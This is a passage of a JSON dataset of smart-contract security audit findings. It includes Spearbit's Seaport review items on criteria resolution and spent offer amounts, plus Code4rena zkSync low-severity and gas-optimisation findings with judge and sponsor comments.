the `itemType` was updated to be the corresponding non-criteria based `itemType`. See `advanced.spec.ts#L510` for a test case.\n\n**Note:** This also means that the fulfiller cannot explicitly provide the identifier when a contract order is being fulfilled. A malicious contract may use this to their advantage. For example, assume that a contract offerer in Seaport only accepts criteria-based offers. The fulfiller may first call `previewOrder` where the criteria is always resolved to a rare NFT, but the actual execution would return an uninteresting NFT. If such offers also required a corresponding resolver (similar behavior as regular criteria-based orders), then this could be fixed by explicitly providing the identifier — akin to a slippage check.\n\nIn short, for regular criteria-based orders with `identifierOrCriteria = 0`, the fulfiller can pick which identifier to receive by providing a `CriteriaResolver` (as long as it's valid). For contract orders, fulfillers don't have this option and contracts may be able to abuse this.\n\n## Recommendation\nAn alternative approach to criteria-based contract orders would be to remove the extra case in `_compareItems`. Now, contract offers will have to return the same `itemType` and `identifierOrCriteria` when an `agenerateOrder` call is made. However, this means that the fulfiller will be able to choose the identifier it wants to receive. This may not be ideal in some cases, but it remains consistent with regular orders.\n\n**Seaport:** We documented this deviation in PR 849.  \n**Spearbit:** Verified.",
      "summary": "\nThis bug report is about a deviation in how criteria-based items are resolved for contract orders in the OrderValidator.sol and CriteriaResolution.sol files. The _compareItems function checks that the contract offerer has returned a corresponding non-criteria based itemType when identifierOrCriteria for the original item is 0. The orderParameters.offer array is then replaced by the offer array returned by the contract offerer. \n\nFor other criteria-based orders such as offers with identifierOrCriteria = 0, the itemType of the order is only updated during the criteria resolution step, which should have a corresponding CriteriaResolver struct. However, for contract offers with identifierOrCriteria = 0, Seaport 1.2 does not expect a corresponding CriteriaResolver struct and will revert if one is provided as the itemType was updated to be the corresponding non-criteria based itemType. This means that the fulfiller cannot explicitly provide the identifier when a contract order is being fulfilled, which a malicious contract may use to their advantage.\n\nThe recommendation is to remove the extra case in_compareItems, which would mean that contract offers will have to return the same itemType and identifierOrCriteria when a generateOrder call is made. This would allow the fulfiller to choose the identifier it wants to receive, although this may not be ideal in some cases. Seaport has documented this deviation in PR 849 and Spearbit has verified it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15953",
      "title": "The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `OrderCombiner.sol#L802-L807`\n- `ConsiderationEncoder.sol#L440-L443`\n- `ZoneInterface.sol#L13-L15`\n- `ContractOffererInterface.sol#L16-L22`\n- `OrderCombiner.sol#L322-L325`\n- `FulfillmentApplier.sol#L299-L306`\n- `FulfillmentApplier.sol#L432-L433`\n- `FulfillmentApplier.sol#L120-L125`\n- `OrderCombiner.sol#L794-L798`\n\n## Description\nWhen Seaport is called to fulfill or match a collection of (advanced) orders, there are scenarios where not all offer items will be used. When not all the current amount of an offer item is used and if this offer item belongs to an order which is of either CONTRACT order type or it is a restricted order (and the caller is not the zone), then the spent amount shared with either the contract offerer or zone through their respective endpoints (`validateOrder` for zones and `ratifyOrder` for contract offerers) does not reflect the actual amount spent.\n\nWhen Seaport is called through one of its more complex endpoints to match or fulfill orders, the offer items go through a few phases:\n\n- **Parameter Description**\n  - `It` - item type\n  - `T` - token\n  - `i` - identifier\n  - `as` - start amount\n  - `ae` - end amount\n  - `acurr` - the interpolation of startAmount and endAmount depending on the time and the fraction of the order.\n  - `O` - offer item.\n\nAssuming an offer item is originally `O = (It, T, i, as, ae)`:\n- In `_validateOrdersAndPrepareToFulfill`, `O` gets transformed into `(It, T, i, acurr, acurr)`\n- Then, depending on whether the order is part of a match (1, 2, 3) or fulfillment (1, 2) order and whether there is corresponding fulfillment data pointing at this offer item, it might transform into `(It, T, i, b, acurr)` where `b ∈ [0, 1)`. For fulfilling a collection of orders, `b ∈ {0, acurr}` depending on whether the offer item gets used or not, but for match orders, it can be in the more general range of `b ∈ [0, 1)`.\n- Finally, for restricted or CONTRACT order types, before calling `_assertRestrictedAdvancedOrderValidity`, the offer item would be transformed into `(It, T, i, acurr, acurr)`.\n\nSo the start amount of an offer item goes through the following flow:\n`as → acurr → b ∈ [0, 1) → acurr`\n\nAt the end, `acurr` is the amount used when Seaport calls into the `validateOrder` of a zone or `ratifyOrder` of a contract offerer. `acurr` does not reflect the actual amount that this offer item has contributed to a combined amount used for an execution transfer.\n\n## Recommendation\nFor non-matched collections of (advanced) orders, the actual spent amount for an offer item is `acurr * b ∈ {0, acurr}`, which reflects whether the item has been used or not. \n\nFor these two Seaport endpoints (`fulfillAvailableOrders`, `fulfillAvailableAdvancedOrders`), one can calculate the actual spent amount. For example, at the end of the flow for `startAmount`, one can do:\n\n```solidity\n// Utilize assembly to calculate the spent amount.\nassembly {\n    let startAmountPtr := add(offerItem, Common_amount_offset)\n    let originalAmount := mload(add(offerItem, Common_endAmount_offset))\n    let unusedAmount := mload(startAmountPtr)\n    mstore(\n        startAmountPtr,\n        sub(originalAmount, unusedAmount)\n    )\n}\n```\n\nFor matched orders, since in certain scenarios, `b` can be any number in `B256`, it would be hard to say how much of that particular offer item was spent or not spent. Thus, the above suggestion would not work in general for matched orders.\n\n### Seaport\nFixed in PR 839 by making sure all unspent offer amounts are transferred to the recipient provided by the `msg.sender`.\n\n### Spearbit\nVerified.",
      "summary": "\nThis bug report is about an issue with the Seaport platform, which is used to match and fulfill orders. The problem is that when not all of the current amount of an offer item is used, the amount shared with either the contract offerer or zone through their respective endpoints does not reflect the actual amount spent. This is because the offer item's start amount goes through a transformation process and the end amount, acurr, does not reflect the actual amount spent.\n\nTo fix this issue, Seaport proposed a solution in PR 839 where all unspent offer amounts are transferred to the recipient provided by the msg.sender. This was verified by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15952",
      "title": "The spent offer amounts provided to OrderFulfilled for collection of (advanced) orders is not the actual amount spent in general",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- **OrderCombiner.sol**: Lines 455-463\n- **OrderFulfiller.sol**: Lines 377-385\n\n## Description\nWhen Seaport is called to fulfill or match a collection of (advanced) orders, the `OrderFulfilled` is called before applying fulfillments and executing transfers. The offer and consideration items have the following forms:\n\n- **C** = (It, T, i, acurr, R, acurr)  \n- **O** = (It, T, i, acurr, acurr)  \n\n### Parameter Description\n| Parameter | Description                                                        |\n|-----------|--------------------------------------------------------------------|\n| It        | itemType                                                          |\n| T         | token                                                             |\n| i         | identifier                                                        |\n| acurr     | the interpolation of startAmount and endAmount depending on the time and the fraction of the order. |\n| R         | consideration item's recipient                                      |\n| O         | offer item.                                                       |\n| C         | consideration item.                                               |\n\nThe `SpentItem` and `ReceivedItem` items provided to the `OrderFulfilled` event ignore the last component of the offer/consideration items in the above form since they are redundant.\n\nSeaport enforces that all consideration items are used. But for the endpoints in this context, we might end up with offer items with only a portion of their amounts being spent. So in the end, `O.acurr` might not be the amount spent for this offer item, but `OrderFulfilled` emits `O.acurr` as the amount spent. This can cause discrepancies in off-chain bookkeeping by agents listening for this event.\n\nThe `fulfillOrder` and `fulfillAdvancedOrder` do not have this issue, since all items are enforced to be used. These two endpoints also differ from when there are collections of (advanced) orders, in that they would emit the `OrderFulfilled` at the end of their call before clearing the reentrancy guard.\n\n## Recommendation\nMake sure the accounting is updated to only provide the spent offer item amounts to `OrderFulfilled`. Moving the emission of this event to the end of the call flow, before clearing the reentrancy guard, like the aforementioned simpler endpoint would make it easier to provide the correct values. This approach would also make the whole flow between different endpoints more consistent and potentially create an opportunity to refactor the codebase further.\n\n## Seaport \nFixed in PR 839 by making sure all unspent offer amounts are transferred to the recipient provided by `msg.sender`.\n\n## Spearbit \nVerified.",
      "summary": "\nThis bug report is about a discrepancy in off-chain bookkeeping by agents listening to the OrderFulfilled event. The problem occurs when Seaport is called to fulfill or match a collection of (advanced) orders. The offer and consideration items have certain forms and the SpentItem and ReceivedItem items provided to the OrderFulfilled event ignore the last component of the offer/consideration items. This causes discrepancies in off-chain bookkeeping because the OrderFulfilled event emits O.acurr as the amount spent, which might not be the actual amount spent for the offer item.\n\nThe recommendation was to make sure the accounting is updated to only provide the spent offer item amounts to OrderFulfilled. Moving the emission of this event to the end of the call flow before clearing the reentrancy guard would make it easier to provide the correct values and make the whole flow between different endpoints more consistent.\n\nSeaport fixed the issue in PR 839 by making sure all unspent offer amounts are transferred to the recipient provided by the msg.sender. Spearbit verified the fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "23782",
      "title": "[07]",
      "impact": "LOW",
      "content": "\nWhen a block is committed, its hash will be stored in `storedBlockHashes`:<br>\n[Executor.sol#L164](https://github.com/code-423n4/2022-10-zksync/blob/358f38736351a8a27e325dfcb665eeba5ec02bd5/ethereum/contracts/zksync/facets/Executor.sol#L164)<br>\n\nIf this block is reverted, it is not removed from `storedBlockHashes`:<br>\n[Executor.sol#L336](https://github.com/code-423n4/2022-10-zksync/blob/358f38736351a8a27e325dfcb665eeba5ec02bd5/ethereum/contracts/zksync/facets/Executor.sol#L336)<br>\n\nThe vulnerability is that in the `GettersFacet`, the function `storedBlockHash(...)` will return the hash of a reverted block if this block number is given as its parameter, while it should return 0.<br>\n[Getters.sol#L86](https://github.com/code-423n4/2022-10-zksync/blob/358f38736351a8a27e325dfcb665eeba5ec02bd5/ethereum/contracts/zksync/facets/Getters.sol#L86)<br>\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/49#issuecomment-1325835625):**\n > **The critical parameters in initialize(...) are not set safely:**<br>\n> \n> Logically equivalent to address(0) check, Low\n> \n> **approveEmergencyDiamondCutAsSecurityCouncilMemberBySignature**<br>\n>\n> Not sure what this means, but if it means one caller gets to approve emerengency cuts, this is a glaring security risk.\n> \n> **Better to have config facet, in case some update is needed in the config.sol**<br>\n>\n> Not convinced by this one either, ultimately it's called config but it's just a bunch of contact / base contract\n> \n> **L2_LOG_BYTES is not correct, it should be `L2_TO_L1_LOG_SERIALIZE_SIZE`**<br>\n>\n> Non-Critical\n> \n> **It is not needed to have modifier senderCanCallFunction for the function deposit in both L1ERC20Bridge and L1ETHBridge, because they call the function requestL2Transaction in the MailBox that has already such modifier.**<br>\n>\n> Not convinced in lack of detail, if you call contract X and contract X calls contract Y, then the check is necessary on both contracts\n> \n> **For each deposit of an ERC20 token, the information**<br>\n>\n> Unclear what you'd do and where the savings would be.\n> \n> **When a block is committed, its hash will be stored in storedBlockHashes:**\n>\n> See [`#204`](https://github.com/code-423n4/2022-10-zksync-findings/issues/204), Low\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/49#issuecomment-1335920135):**\n > 2 Low, 1 Non-Critical\n>\n > Report was pretty good, but the downgraded findings add a lot of points to this QA.\n> \n> While the Warden has sent a few false positives, I think the value they offered for this contest warrants them winning the best QA report.\n\n*(Note: please see warden's [original submission](https://github.com/code-423n4/2022-10-zksync-findings/issues/49) for links to the referenced downgraded findings)*\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/49#issuecomment-1336268291):**\n >  Thanks, @Alex the Entreprenerd for your comment, that we are now looking at this report more seriously.<br>\n>\n> IMO, No.2 “approveEmergencyDiamondCutAsSecurityCouncilMemberBySignature“ can be a security issue. This is what we are now implementing to make security council members be able to approve the proposal by signature.<br>\n>\n> The security issue is that in case the security council members do not have access to approve on-chain, the governor must wait for their approval to bypass the notice period. In case the proposal should be executed instantly (in case of a critical bug in our protocol), this delay can be dangerous to our protocol.<br>\n>\n> By having approval by signature, the security members can approve a proposal off-chain, and the governor can execute the instant upgrade on behalf of them by using their signatures, so all-time access to the chain is not necessary for security council members.<br>\n>\n> Moreover, in case a critical proposal should be executed silently, it is necessary to be able to approve by signature. Because, the governor, in one batch transaction, proposes the proposal, and approves the upgrade on behalf of the security council members by using their signatures, and then executes the proposal. Since all the above actions are done in one transaction, there is no security risk of vulnerability leak. But, in the current structure, when the governor proposes the proposal, should wait for security members’ approval, this delay can be transparent to a malicious user to investigate the governor’s proposal, and gets a clue what the vulnerability is and then exploits the protocol.<br>\n>\n> This report worths to be upgraded in terms of severity!\n> Thanks.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/49#issuecomment-1340174006):**\n> Thank you for your insight, I have sent the contest to triage, took note of your feedback and am sharing with other Judges and Wardens.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/49#issuecomment-1343557528):**\n > Similarly to [`#48`](https://github.com/code-423n4/2022-10-zksync-findings/issues/48), I have shared this finding with 2 Judges and a Top warden and we all agree that this is effectively the same finding, with similar impact.\n> \n> As such Low Severity is the most appropriate.\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/49#issuecomment-1343993682):**\n > Thanks for the follow-up!\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23781",
      "title": "[06]",
      "impact": "LOW",
      "content": "\nFor each deposit of an ERC20 token, the information of the token is read and packed and sent to L2. Even if this token is used before for deposit, again this information is sent to L2, which is waste of gas.<br>\n[L1ERC20Bridge.sol#L164-L169](https://github.com/code-423n4/2022-10-zksync/blob/456078b53a6d09636b84522ac8f3e8049e4e3af5/ethereum/contracts/bridge/L1ERC20Bridge.sol#L164-L169)<br>\n[L1ERC20Bridge.sol#L155](https://github.com/code-423n4/2022-10-zksync/blob/456078b53a6d09636b84522ac8f3e8049e4e3af5/ethereum/contracts/bridge/L1ERC20Bridge.sol#L155)<br>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23780",
      "title": "[05]",
      "impact": "LOW",
      "content": "\nIt is not needed to have modifier `senderCanCallFunction` for the function `deposit` in both `L1ERC20Bridge` and `L1ETHBridge`, because they call the function `requestL2Transaction` in the `MailBox` that has already such modifier.<br>\n[L1EthBridge.sol#L92](https://github.com/code-423n4/2022-10-zksync/blob/358f38736351a8a27e325dfcb665eeba5ec02bd5/ethereum/contracts/bridge/L1EthBridge.sol#L92)<br>\n[Mailbox.sol#L112](https://github.com/code-423n4/2022-10-zksync/blob/358f38736351a8a27e325dfcb665eeba5ec02bd5/ethereum/contracts/zksync/facets/Mailbox.sol#L112)<br>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23779",
      "title": "[04]",
      "impact": "LOW",
      "content": "\n`L2_LOG_BYTES` is not correct, it should be `L2_TO_L1_LOG_SERIALIZE_SIZE`<br>\n[Config.sol#L19](https://github.com/code-423n4/2022-10-zksync/blob/456078b53a6d09636b84522ac8f3e8049e4e3af5/ethereum/contracts/zksync/Config.sol#L19)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23778",
      "title": "[03]",
      "impact": "LOW",
      "content": "\nBetter to have config facet, in case some update is needed in the `config.sol`. Therefore, it is not necessary to redeploy the facets that imported config (like `Executor` and `Mailbox`).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23777",
      "title": "[02]",
      "impact": "LOW",
      "content": "\nBetter to have also `approveEmergencyDiamondCutAsSecurityCouncilMemberBySignature`, in case the security council members do not have access to ethereum blockchain or in case it is needed to approve just in one transaction by batch of signatures (to bypass the notice period).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23776",
      "title": "[01]",
      "impact": "LOW",
      "content": "\nThe critical parameters in `initialize(...)` are not set safely:\n\n*   `s.governor` should be set to `msg.sender`, because a wrong governor address will result in loss of access to all other parts, and later changing the governor to the correct address.\n*   `_l2BootloaderBytecodeHash` should be validated like `L2ContractHelper.validateBytecodeHash(_l2BootloaderBytecodeHash)` as in `GovernanceFacet`\n*   `_l2DefaultAccountBytecodeHash` should be validated like `L2ContractHelper.validateBytecodeHash(_l2DefaultAccountBytecodeHash)` as in `GovernanceFacet`\n\n[DiamondInit.sol#L39](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/DiamondInit.sol#L39)<br>\n[DiamondInit.sol#L58](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/DiamondInit.sol#L58)<br>\n[DiamondInit.sol#L59](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/DiamondInit.sol#L59)<br>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5758",
      "title": "[G-09] Use `require` instead of `assert`",
      "impact": "GAS",
      "content": "\nThe `assert()` and `require()` functions are a part of the error handling aspect in Solidity. Solidity makes use of state-reverting error handling exceptions. This means all changes made to the contract on that call or any sub-calls are undone if an error is thrown. It also flags an error.\n\nThey are quite similar as both check for conditions and if they are not met, would throw an error.\n\nThe big difference between the two is that the `assert()` function when false, **uses up all the remaining gas and reverts all the changes made.**\n\nMeanwhile, a `require()` function when false, also reverts back all the changes made to the contract but **does refund all the remaining gas fees we offered to pay**. This is the most common Solidity function used by developers for debugging and error handling.\n\n**Affected source code:**\n\n*   [DiamondCut.sol:16](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L16)\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/35#issuecomment-1326853179):**\n > **[G-01] Use require instead of assert**<br>\n> Valid but will only run in constructor so ignoring\n> \n> **[G-02] Avoid compound assignment operator in state variables**<br>\n> Awarding 34 as that's what I get when changing the in-scope tests\n> \n> **[G-03] Use calldata instead of memory**<br>\n> Cannot test the benchmark, but it's roughly in the hundreds, let's say 200 gas\n> \n> **[G-04] Shift right or left instead of dividing or multiply by 2**<br>\n> This mostly saves gas because of the unchecked, let's say 100 gas\n> \n> **[G-05] There's no need to set default values for variables**<br>\n> Those are constants, will be inlined by the compiler\n> \n> **[G-06] Unnecessary cast in Mailbox.serializeL2Transaction**<br>\n> The cast should be optimized away by the compiler as no supporting variable is declared\n> \n> **[G-07] Gas saving using immutable**<br>\n> 2.1k per var<br>\n> 8.4k<br>\n> \n> **[G-08] Reorder structure layout**<br>\n> 2k each as it will save one extra cold Slot Load<br>\n> 4k\n> \n> Pretty good, but would benefit by using benchmarks from the codebase in-scope.\n>\n > 10734\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/35#issuecomment-1336220069):**\n > Ultimately offered the strongest savings via immutables and did not offer false positives vs other reports, also found the packing refactoring which will offer great savings to end users.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-09-use-require-instead-of-assert",
      "tags": [],
      "finders": []
    },
    {
      "id": "5757",
      "title": "[G-08] Reorder structure layout",
      "impact": "GAS",
      "content": "\nThe following structs could be optimized moving the position of certains values in order to save slot storages:\n\n`StoredBlockInfo` in [IExecutor.sol#L15-L24](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/interfaces/IExecutor.sol#L15-L24)\n\n```diff\n    struct StoredBlockInfo {\n        uint64 blockNumber;\n+       uint64 indexRepeatedStorageChanges;\n        bytes32 blockHash;\n-       uint64 indexRepeatedStorageChanges;\n        uint256 numberOfLayer1Txs;\n        bytes32 priorityOperationsHash;\n        bytes32 l2LogsTreeRoot;\n        uint256 timestamp;\n        bytes32 commitment;\n    }\n```\n\n`AppStorage` in [Storage.sol:69-106](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/Storage.sol#L69-L106)\n\n```diff\nstruct AppStorage {\n    /// @dev Storage of variables needed for diamond cut facet\n    DiamondCutStorage diamondCutStorage;\n    /// @notice Address which will exercise governance over the network i.e. change validator set, conduct upgrades\n    address governor;\n+   bool zkPorterIsAvailable;\n    /// @notice Address that governor proposed as one that will replace it\n    address pendingGovernor;\n    /// @notice List of permitted validators\n    mapping(address => bool) validators;\n    /// @dev Verifier contract. Used to verify aggregated proof for blocks\n    Verifier verifier;\n    /// @notice Total number of executed blocks i.e. blocks[totalBlocksExecuted] points at the latest executed block (block 0 is genesis)\n    uint256 totalBlocksExecuted;\n    /// @notice Total number of proved blocks i.e. blocks[totalBlocksProved] points at the latest proved block\n    uint256 totalBlocksVerified;\n    /// @notice Total number of committed blocks i.e. blocks[totalBlocksCommitted] points at the latest committed block\n    uint256 totalBlocksCommitted;\n    /// @dev Stored hashed StoredBlock for block number\n    mapping(uint256 => bytes32) storedBlockHashes;\n    /// @dev Stored root hashes of L2 -> L1 logs\n    mapping(uint256 => bytes32) l2LogsRootHashes;\n    /// @dev Container that stores transactions requested from L1\n    PriorityQueue.Queue priorityQueue;\n    /// @dev The smart contract that manages the list with permission to call contract functions\n    IAllowList allowList;\n    /// @notice Part of the configuration parameters of ZKP circuits. Used as an input for the verifier smart contract\n    VerifierParams verifierParams;\n    /// @notice Bytecode hash of bootloader program.\n    /// @dev Used as an input to zkp-circuit.\n    bytes32 l2BootloaderBytecodeHash;\n    /// @notice Bytecode hash of default account (bytecode for EOA).\n    /// @dev Used as an input to zkp-circuit.\n    bytes32 l2DefaultAccountBytecodeHash;\n    /// @dev Indicates that the porter may be touched on L2 transactions.\n    /// @dev Used as an input to zkp-circuit.\n-   bool zkPorterIsAvailable;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-08-reorder-structure-layout",
      "tags": [],
      "finders": []
    },
    {
      "id": "5756",
      "title": "[G-07] Gas saving using `immutable`",
      "impact": "GAS",
      "content": "\nIt's possible to avoid storage access a save gas using `immutable` keyword for the following variables:\n\nIt's also better to remove the initial values, because they will be set during the constructor.\n\n**Affected source code:**\n\n*   [L2ERC20Bridge.sol:19](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/bridge/L2ERC20Bridge.sol#L19)\n*   [L2ERC20Bridge.sol:23](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/bridge/L2ERC20Bridge.sol#L23)\n*   [L2ERC20Bridge.sol:26](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/bridge/L2ERC20Bridge.sol#L26)\n*   [L2ETHBridge.sol:22](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/bridge/L2ETHBridge.sol#L22)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-07-gas-saving-using-immutable",
      "tags": [],
      "finders": []
    },
    {
      "id": "5755",
      "title": "[G-06] Unnecessary cast in `Mailbox.serializeL2Transaction`",
      "impact": "GAS",
      "content": "\nIt's possible to remove the following casts:\n\n```diff\n    function serializeL2Transaction(\n        uint256 _txId,\n        uint256 _l2Value,\n        address _sender,\n        address _contractAddressL2,\n        bytes calldata _calldata,\n        uint256 _ergsLimit,\n        bytes[] calldata _factoryDeps\n    ) public pure returns (L2CanonicalTransaction memory) {\n        return\n            L2CanonicalTransaction({\n                txType: PRIORITY_OPERATION_L2_TX_TYPE,\n                from: uint256(uint160(_sender)),\n                to: uint256(uint160(_contractAddressL2)),\n                ergsLimit: _ergsLimit,\n                ergsPerPubdataByteLimit: uint256(1),\n                maxFeePerErg: uint256(0),\n                maxPriorityFeePerErg: uint256(0),\n                paymaster: uint256(0),\n-               reserved: [uint256(_txId), _l2Value, 0, 0, 0, 0],\n+               reserved: [_txId, _l2Value, 0, 0, 0, 0],\n                data: _calldata,\n                signature: new bytes(0),\n                factoryDeps: _hashFactoryDeps(_factoryDeps),\n                paymasterInput: new bytes(0),\n                reservedDynamic: new bytes(0)\n            });\n    }\n```\n\n**Affected source code:**\n\n*   [Mailbox.sol:206](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/Mailbox.sol#L206)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-06-unnecessary-cast-in-mailboxserializel2transaction",
      "tags": [],
      "finders": []
    },
    {
      "id": "5754",
      "title": "[G-05] There's no need to set default values for variables",
      "impact": "GAS",
      "content": "\nIf a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.\n\n**Proof of concept (*without optimizations*):**\n\n```javascript\npragma solidity 0.8.15;\n\ncontract TesterA {\nfunction testInit() public view returns (uint) { uint a = 0; return a; }\n}\n\ncontract TesterB {\nfunction testNoInit() public view returns (uint) { uint a; return a; }\n}\n```\n\nGas saving executing: **8 per entry**\n\n    TesterA.testInit:   21392\n    TesterB.testNoInit: 21384\n\n**Affected source code:**\n\n*   [L1EthBridge.sol:33](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/bridge/L1EthBridge.sol#L33)\n*   [L2ETHBridge.sol:28](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/bridge/L2ETHBridge.sol#L28)\n\n### Total gas saved: **8 &ast; 2 = 16**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-05-theres-no-need-to-set-default-values-for-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "5753",
      "title": "[G-04] Shift right or left instead of dividing or multiply by 2",
      "impact": "GAS",
